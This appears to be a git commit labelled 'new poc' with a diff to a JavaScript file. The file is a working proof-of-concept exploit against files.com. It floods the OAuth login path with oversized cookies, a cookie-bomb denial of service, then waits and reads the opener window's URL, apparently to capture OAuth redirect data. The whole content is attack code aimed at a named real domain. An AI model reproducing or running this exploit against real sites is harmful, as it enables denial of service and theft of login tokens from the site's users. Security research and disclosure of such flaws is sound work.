202e1368262de15c4d9baecfc2f4f3d1cdee866f
Magn4 <tahatoo25@gmail.com>
2025-12-28 18:01:41 +0100

    new poc

--- JS/files.js
+++ JS/files.js
@@ -1,4 +1,5 @@
 for (i = 1; i < 4; i++)
   document.cookie = `DoS_POC${i > 1 ? i : ""}=${"w".repeat(4000)};Path=/login_from_oauth;Domain=.files.com`;
 // wait 10 seconds
+await new Promise(resolve => setTimeout(resolve, 10000));
 alert(window.opener.location.href);
